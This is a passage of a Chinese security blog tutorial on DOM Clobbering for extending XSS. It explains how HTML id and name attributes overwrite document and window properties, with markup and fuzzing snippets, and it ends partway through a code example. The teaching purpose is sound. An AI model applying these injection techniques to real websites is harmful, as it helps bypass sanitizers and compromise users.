<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="前几天 PortSwigger 发布了 Top 10 web hacking techniques of 2019，榜上的攻击技术都比较有意思，p牛也肯定会在小密圈做分享的（如果没有话本菜也会在自己博客做做学习分享），所以我们这里就不聊 Top 10 技术了，就看看在 Top 10 提名结果没上榜但是依旧很有意思的技术 Dom Clobbering。\n"><title>使用 Dom Clobbering 扩展 XSS</title>
<link rel=canonical href=https://zeddyu.github.io/p/%E4%BD%BF%E7%94%A8-dom-clobbering-%E6%89%A9%E5%B1%95-xss/><link rel=stylesheet href=https://cdn.jsdelivr.net/gh/zeddyu/zeddyu.github.io///scss/style.min.10c221bc47e4e94f27ea1e7ab28b3ebe2133ce2020a73c833b3276d59450e687.css integrity="sha256-EMIhvEfk6U8n6h56sos+viEzziAgpzyDOzJ21ZRQ5oc=" crossorigin=anonymous><meta property='og:title' content="使用 Dom Clobbering 扩展 XSS"><meta property='og:description' content="前几天 PortSwigger 发布了 Top 10 web hacking techniques of 2019，榜上的攻击技术都比较有意思，p牛也肯定会在小密圈做分享的（如果没有话本菜也会在自己博客做做学习分享），所以我们这里就不聊 Top 10 技术了，就看看在 Top 10 提名结果没上榜但是依旧很有意思的技术 Dom Clobbering。\n"><meta property='og:url' content='https://zeddyu.github.io/p/%E4%BD%BF%E7%94%A8-dom-clobbering-%E6%89%A9%E5%B1%95-xss/'><meta property='og:site_name' content="Zeddy's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='XSS'><meta property='article:published_time' content='2020-03-04T02:15:58+00:00'><meta property='article:modified_time' content='2020-03-04T02:15:58+00:00'><meta name=twitter:title content="使用 Dom Clobbering 扩展 XSS"><meta name=twitter:description content="前几天 PortSwigger 发布了 Top 10 web hacking techniques of 2019，榜上的攻击技术都比较有意思，p牛也肯定会在小密圈做分享的（如果没有话本菜也会在自己博客做做学习分享），所以我们这里就不聊 Top 10 技术了，就看看在 Top 10 提名结果没上榜但是依旧很有意思的技术 Dom Clobbering。\n"><link rel="shortcut icon" href=/favicon.ico><style>body:has(.article-content){.article-readmore { display: none; }}</style><script>enScroll=!1,enFdl=!1,extCurrent=void 0,filename=void 0,targetText=void 0,splitOrigin=void 0;const lStor=localStorage,sStor=sessionStorage,doc=document,docEl=document.documentElement,docBody=document.body,docLoc=document.location,w=window,s=screen,nav=navigator||{},extensions=["pdf","xls","xlsx","doc","docx","txt","rtf","csv","exe","key","pps","ppt","pptx","7z","pkg","rar","gz","zip","avi","mov","mp4","mpe","mpeg","wmv","mid","midi","mp3","wav","wma"];function a(e,t,n,o){const j="G-PDESKL57LT",r=()=>Math.floor(Math.random()*1e9)+1,c=()=>Math.floor(Date.now()/1e3),F=()=>(sStor._p||(sStor._p=r()),sStor._p),E=()=>r()+"."+c(),_=()=>(lStor.cid_v4||(lStor.cid_v4=E()),lStor.cid_v4),m=lStor.getItem("cid_v4"),v=()=>m?void 0:enScroll==!0?void 0:"1",p=()=>(sStor.sid||(sStor.sid=c()),sStor.sid),O=()=>{if(!sStor._ss)return sStor._ss="1",sStor._ss;if(sStor.getItem("_ss")=="1")return void 0},a="1",g=()=>{if(sStor.sct)if(enScroll==!0)return sStor.sct;else x=+sStor.getItem("sct")+ +a,sStor.sct=x;else sStor.sct=a;return sStor.sct},i=docLoc.search,b=new URLSearchParams(i),h=["q","s","search","query","keyword"],y=h.some(e=>i.includes("&"+e+"=")||i.includes("?"+e+"=")),u=()=>y==!0?"view_search_results":enScroll==!0?"scroll":enFdl==!0?"file_download":"page_view",f=()=>enScroll==!0?"90":void 0,C=()=>{if(u()=="view_search_results"){for(let e of b)if(h.includes(e[0]))return e[1]}else return void 0},d=encodeURIComponent,k=e=>{let t=[];for(let n in e)e.hasOwnProperty(n)&&e[n]!==void 0&&t.push(d(n)+"="+d(e[n]));return t.join("&")},A=!1,S="https://ga.zeddyu-lu.workers.dev/collect_path",M=k({v:"2",tid:j,_p:F(),sr:(s.width*w.devicePixelRatio+"x"+s.height*w.devicePixelRatio).toString(),ul:(nav.language||void 0).toLowerCase(),cid:_(),_fv:v(),_s:"1",dl:docLoc.origin+docLoc.pathname+i,dt:doc.title||void 0,dr:doc.referrer||void 0,sid:p(),sct:g(),seg:"1",en:u(),"epn.percent_scrolled":f(),"ep.search_term":C(),"ep.file_extension":e||void 0,"ep.file_name":t||void 0,"ep.link_text":n||void 0,"ep.link_url":o||void 0,_ss:O(),_dbg:A?1:void 0}),l=S+"?"+M;if(nav.sendBeacon)nav.sendBeacon(l);else{let e=new XMLHttpRequest;e.open("POST",l,!0)}}a();function sPr(){return(docEl.scrollTop||docBody.scrollTop)/((docEl.scrollHeight||docBody.scrollHeight)-docEl.clientHeight)*100}doc.addEventListener("scroll",sEv,{passive:!0});function sEv(){const e=sPr();if(e<90)return;enScroll=!0,a(),doc.removeEventListener("scroll",sEv,{passive:!0}),enScroll=!1}document.addEventListener("DOMContentLoaded",function(){let e=document.getElementsByTagName("a");for(let t=0;t<e.length;t++)if(e[t].getAttribute("href")!=null){const n=e[t].getAttribute("href"),s=n.substring(n.lastIndexOf("/")+1),o=s.split(".").pop();(e[t].hasAttribute("download")||extensions.includes(o))&&e[t].addEventListener("click",fDl,{passive:!0})}});function fDl(e){enFdl=!0;const t=e.currentTarget.getAttribute("href"),n=t.substring(t.lastIndexOf("/")+1),s=n.split(".").pop(),o=n.replace("."+s,""),i=e.currentTarget.text,r=t.replace(docLoc.origin,"");a(s,o,i,r),enFdl=!1}</script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu15151579442685596205.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Zeddy's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/ZeddYu target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://zeddyu.github.io/atom.xml target=_blank title=Rss rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://x.com/ZeddYu_Lu target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/ads/><svg class="icon icon-tabler icon-tabler-ad" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 15v-4a2 2 0 014 0v4"/><line x1="7" y1="13" x2="11" y2="13"/><path d="M17 9v6h-1.5a1.5 1.5.0 111.5-1.5"/></svg>
<span>Advertisement</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#basics>Basics</a></li><li><a href=#simple-example>Simple Example</a><ol><li><a href=#exmaple-1---create>Exmaple 1 - Create</a></li><li><a href=#example-2---overwrite>Example 2 - Overwrite</a></li><li><a href=#example-3---overwrite2>Example 3 - Overwrite2</a></li></ol></li><li><a href=#attack-method>Attack Method</a><ol><li><a href=#tostring>toString</a></li><li><a href=#htmlcollection>HTMLCollection</a></li><li><a href=#html-relationships>HTML Relationships</a></li><li><a href=#three-level>Three Level</a></li><li><a href=#more>More</a></li><li><a href=#custom>Custom</a></li></ol></li><li><a href=#exploit-example>Exploit Example</a><ol><li><a href=#lab-exploiting-dom-clobbering-to-enable-xss>Lab: Exploiting DOM clobbering to enable XSS</a></li><li><a href=#labclobbering-dom-attributes-to-bypass-html-filters>Lab:Clobbering DOM attributes to bypass HTML filters</a></li><li><a href=#cve-2017-0928-bypassing-sanitization-using-dom-clobbering>CVE-2017-0928 Bypassing sanitization using DOM clobbering</a></li><li><a href=#xss-in-gmails-amp4email-via-dom-clobbering>XSS in GMail’s AMP4Email via DOM Clobbering</a></li></ol></li><li><a href=#thinking>Thinking</a><ol><li><a href=#document--id>Document & Id</a></li><li><a href=#document--name>Document & Name</a></li><li><a href=#document--name--id>Document & Name & Id</a></li><li><a href=#window--id>Window & Id</a></li><li><a href=#window--name>Window & Name</a></li><li><a href=#not-clobbered>&lsquo;Not Clobbered&rsquo;</a></li><li><a href=#dom-doc>Dom Doc</a></li><li><a href=#window>Window</a></li><li><a href=#document>Document</a></li></ol></li><li><a href=#cause>Cause</a><ol><li><a href=#location>Location</a></li><li><a href=#cookie>Cookie</a></li><li><a href=#document-collection>Document Collection</a></li><li><a href=#window-collection>Window Collection</a></li></ol></li><li><a href=#bouns>Bouns</a><ol><li><a href=#tip-1-global-scope>Tip 1 Global Scope</a><ol><li><a href=#显式声明>显式声明</a></li><li><a href=#隐式声明>隐式声明</a></li><li><a href=#let--var>let & var</a></li></ol></li><li><a href=#tip-2-overwrite-function>Tip 2 Overwrite function</a></li><li><a href=#tip-3-prototype-pollution>Tip 3 Prototype Pollution</a></li></ol></li><li><a href=#defence>Defence</a></li><li><a href=#references>References</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/sec/ style=background-color:#0b0;color:#fff>Sec</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E4%BD%BF%E7%94%A8-dom-clobbering-%E6%89%A9%E5%B1%95-xss/>使用 Dom Clobbering 扩展 XSS</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Mar 04, 2020</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>20 minute read</time></div><div class=article-readmore><a href=/p/%E4%BD%BF%E7%94%A8-dom-clobbering-%E6%89%A9%E5%B1%95-xss/>Read More…</a></div></footer></div></header><section class=article-content><p>前几天 PortSwigger 发布了 <a class=link href=https://portswigger.net/research/top-10-web-hacking-techniques-of-2019 target=_blank rel=noopener>Top 10 web hacking techniques of 2019</a>，榜上的攻击技术都比较有意思，p牛也肯定会在小密圈做分享的（如果没有话本菜也会在自己<a class=link href=https://zeddyu.github.io target=_blank rel=noopener>博客</a>做做学习分享），所以我们这里就不聊 Top 10 技术了，就看看在 Top 10 提名结果没上榜但是依旧很有意思的技术 Dom Clobbering。</p><style type=text/css>.notice{--title-color:#fff;--title-background-color:#6be;--content-color:#444;--content-background-color:#e7f2fa}.notice.info{--title-background-color:#fb7;--content-background-color:#fec}.notice.tip{--title-background-color:#5a5;--content-background-color:#efe}.notice.warning{--title-background-color:#c33;--content-background-color:#fee}@media(prefers-color-scheme:dark){.notice{--title-color:#fff;--title-background-color:#069;--content-color:#ddd;--content-background-color:#023}.notice.info{--title-background-color:#a50;--content-background-color:#420}.notice.tip{--title-background-color:#363;--content-background-color:#121}.notice.warning{--title-background-color:#800;--content-background-color:#400}}body.dark .notice{--title-color:#fff;--title-background-color:#069;--content-color:#ddd;--content-background-color:#023}body.dark .notice.info{--title-background-color:#a50;--content-background-color:#420}body.dark .notice.tip{--title-background-color:#363;--content-background-color:#121}body.dark .notice.warning{--title-background-color:#800;--content-background-color:#400}.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:var(--content-color);background:var(--content-background-color)}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:var(--title-color);background:var(--title-background-color)}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:.125em;position:relative}</style><div class="notice tip"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="300.5 134 300 300"><path d="M551.281 252.36c0-3.32-1.172-6.641-3.515-8.985l-17.774-17.578c-2.344-2.344-5.469-3.711-8.789-3.711-3.32.0-6.445 1.367-8.789 3.71l-79.687 79.493-44.141-44.14c-2.344-2.344-5.469-3.712-8.79-3.712-3.32.0-6.444 1.368-8.788 3.711l-17.774 17.579c-2.343 2.343-3.515 5.664-3.515 8.984s1.172 6.445 3.515 8.789l70.704 70.703c2.343 2.344 5.664 3.711 8.789 3.711 3.32.0 6.64-1.367 8.984-3.71l106.055-106.056c2.343-2.343 3.515-5.468 3.515-8.789zM600.5 284c0 82.813-67.188 150-150 150-82.813.0-150-67.188-150-150 0-82.813 67.188-150 150-150 82.813.0 150 67.188 150 150z"/></svg>
</span>Tip</p><p>文章首发于先知社区：https://xz.aliyun.com/t/7329</p></div><h2 id=basics>Basics</h2><p>From <a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction target=_blank rel=noopener>MDN Web Docs</a>:</p><blockquote><p>​ The Document Object Model (DOM) is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style, and content. The DOM represents the document as nodes and objects. That way, programming languages can connect to the page.</p><p>A Web page is a document. This document can be either displayed in the browser window or as the HTML source. But it is the same document in both cases. The Document Object Model (DOM) represents that same document so it can be manipulated. The DOM is an object-oriented representation of the web page, which can be modified with a scripting language such as JavaScript.</p><p>The <a class=link href=http://www.w3.org/DOM/ target=_blank rel=noopener>W3C DOM</a> and <a class=link href=https://dom.spec.whatwg.org/ target=_blank rel=noopener>WHATWG DOM</a> standards are implemented in most modern browsers. Many browsers extend the standard, so care must be exercised when using them on the web where documents may be accessed by various browsers with different DOMs.</p></blockquote><p>DOM 最初是在没有任何标准化的情况下诞生和实现的，这导致了许多特殊的行为，但是为了保持兼容性，很多浏览器仍然支持异常的 DOM 。</p><p>DOM 的旧版本（即DOM Level 0 & 1）仅提供了有限的通过 JavaScript 引用元素的方式，一些经常使用的元素具有专用的集合（例如<code>document.forms</code>），而其他元素可以通过<code>Window</code>和<code>Document</code>对象上的<code>name</code>属性和<code>id</code>属性来引用，</p><p>显然，支持这些引用方式会引起混淆，即使较新的规范试图解决此问题，但是为了向后兼容，大多数行为都不能轻易更改。并且，浏览器之间没有共识，因此每个浏览器可能遵循不同的规范（甚至根本没有标准）。显然，缺乏标准化意味着确保DOM的安全是一项重大挑战。</p><p>由于非标准化的 DOM 行为，浏览器有时可能会向各种 DOM 元素添加 name & id 属性，作为对文档或全局对象的属性引用，但是，这会导致覆盖掉 document原有的属性或全局变量，或者劫持一些变量的内容，而且不同的浏览器还有不同的解析方式，所以本文的内容如果没有特别标注，均默认在 <strong>Chrome 80.0.3987.116</strong> 版本上进行。</p><p>Dom Clobbering 就是一种将 HTML 代码注入页面中以操纵 DOM 并最终更改页面上 JavaScript 行为的技术。 在无法直接 XSS 的情况下，我们就可以往 DOM Clobbering 这方向考虑了。</p><h2 id=simple-example>Simple Example</h2><p>其实 Dom Clobbering 比较简单，我们看几个简单的例子就能知道它是干什么了的。</p><h3 id=exmaple-1---create>Exmaple 1 - Create</h3><p><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png loading=lazy></p><p>从图中我们可以看到通过 id 或者 name 属性，我们可以在<code>document</code>或者<code>window</code>对象下创建一个对象。</p><h3 id=example-2---overwrite>Example 2 - Overwrite</h3><p><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png loading=lazy></p><p>可以看到<code>document.cookie</code>已经被我们用 img 标签给覆盖了</p><h3 id=example-3---overwrite2>Example 3 - Overwrite2</h3><p><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png loading=lazy></p><p>可以看到我们通过多层覆盖掉了<code>document.body.appendChild</code>方法。</p><h2 id=attack-method>Attack Method</h2><p>既然我们可以通过这种方式去创建或者覆盖 document 或者 window 对象的某些值，但是看起来我们举的例子只是利用标签创建或者覆盖最终得到的也是标签，是一个<code>HTMLElment</code>对象。</p><p><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png loading=lazy></p><p>但是对于大多数情况来说，我们可能更需要将其转换为一个可控的字符串类型，以便我们进行操作。</p><h3 id=tostring>toString</h3><p>所以我们可以通过以下代码来进行 fuzz 得到可以通过<code>toString</code>方法将其转换成字符串类型的标签：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nb>Object</span><span class=p>.</span><span class=nx>getOwnPropertyNames</span><span class=p>(</span><span class=nb>window</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nx>filter</span><span class=p>(</span><span class=nx>p</span> <span class=p>=&gt;</span> <span class=nx>p</span><span class=p>.</span><span class=nx>match</span><span class=p>(</span><span class=sr>/Element$/</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nx>map</span><span class=p>(</span><span class=nx>p</span> <span class=p>=&gt;</span> <span class=nb>window</span><span class=p>[</span><span class=nx>p</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nx>filter</span><span class=p>(</span><span class=nx>p</span> <span class=p>=&gt;</span> <span class=nx>p</span> <span class=o>&amp;&amp;</span> <span class=nx>p</span><span class=p>.</span><span class=nx>prototype</span> <span class=o>&amp;&amp;</span> <span class=nx>p</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>toString</span> <span class=o>!==</span> <span class=nb>Object</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>toString</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>我们可以得到两种标签对象：<code>HTMLAreaElement (&lt;area>)</code>& <code>HTMLAnchorElement (&lt;a>)</code>，这两个标签对象我们都可以利用<code>href</code>属性来进行字符串转换。</p><p><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png loading=lazy></p><h3 id=htmlcollection>HTMLCollection</h3><p>但是如果我们需要的是<code>x.y</code>这种形式呢？两层结构我们应该怎么办呢？我们可以尝试上述的办法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>y</span> <span class=na>href</span><span class=o>=</span><span class=s>&#39;1:hasaki&#39;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>y</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里无论第一个标签怎么组合，得到的结果都只是<code>undefined</code>。但是我们可以通过另一种方法加入引入 name 属性就会有其他的效果。</p><p><code>HTMLCollection</code>是一个<code>element</code>的“集合”类，在最新的 <a class=link href=https://dom.spec.whatwg.org/#interface-htmlcollection target=_blank rel=noopener>Dom 标准</a>中 IDL 描述如下：</p><blockquote><p>[Exposed=Window, LegacyUnenumerableNamedProperties]
interface HTMLCollection {
readonly attribute unsigned long length;
getter Element? item(unsigned long index);
getter Element? namedItem(DOMString name);
};</p></blockquote><p>文中也提到了</p><blockquote><p>​ <code>HTMLCollection</code> <em>is a historical artifact we cannot rid the web of. While developers are of course welcome to keep using it, new API standard designers ought not to use it (use</em> <code>sequence</code> <em>in IDL instead).</em></p></blockquote><p>它是一种历史产物，并且在今天我们也可以继续使用这个类，只是对于 API 标准设计者不推荐再使用。</p><p>关于它的用法：</p><blockquote><p>collection . <code>length</code></p><p>​ Returns the number of <a class=link href=https://dom.spec.whatwg.org/#concept-element target=_blank rel=noopener>elements</a> in the <a class=link href=https://dom.spec.whatwg.org/#concept-collection target=_blank rel=noopener>collection</a>.</p><p>element = collection . <code>item(index)</code></p><p>element = collection[index]</p><p>​ Returns the <a class=link href=https://dom.spec.whatwg.org/#concept-element target=_blank rel=noopener>element</a> with index index from the <a class=link href=https://dom.spec.whatwg.org/#concept-collection target=_blank rel=noopener>collection</a>. The <a class=link href=https://dom.spec.whatwg.org/#concept-element target=_blank rel=noopener>elements</a> are sorted in <a class=link href=https://dom.spec.whatwg.org/#concept-tree-order target=_blank rel=noopener>tree order</a>.</p><p>element = collection . <code>namedItem(name)</code></p><p>element = collection[name]</p><p>​ Returns the first <a class=link href=https://dom.spec.whatwg.org/#concept-element target=_blank rel=noopener>element</a> with <a class=link href=https://dom.spec.whatwg.org/#concept-id target=_blank rel=noopener>ID</a> or name name from the collection.</p></blockquote><p>让我们值得注意的是我们可以通过<code>collection[name]</code>的形式来调用其中的元素，所以我们似乎可以通过先构建一个<code>HTMLCollection</code>，再通过<code>collection[name]</code>的形式来调用。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;x&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;x&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>y</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;1:hasaki&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png loading=lazy></p><h3 id=html-relationships>HTML Relationships</h3><p>再者，我们也可以通过利用 HTML 标签之间存在的关系来构建层级关系。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>log</span><span class=o>=</span><span class=p>[];</span>
